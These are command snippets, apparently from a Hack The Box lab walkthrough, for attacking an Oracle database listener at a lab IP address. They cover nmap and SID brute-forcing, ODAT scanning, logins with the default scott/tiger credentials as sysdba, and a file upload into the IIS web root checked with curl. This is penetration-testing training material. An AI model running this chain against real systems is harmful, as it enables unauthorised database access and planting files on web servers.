...
```
frank-106@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
...
```
frank-106@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
...
```
frank-106@htb[/htb]$ ./odat.py all -s 10.129.204.235
...
```
frank-106@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
...
```
frank-106@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
...
```
frank-106@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
frank-106@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
...
```
frank-106@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
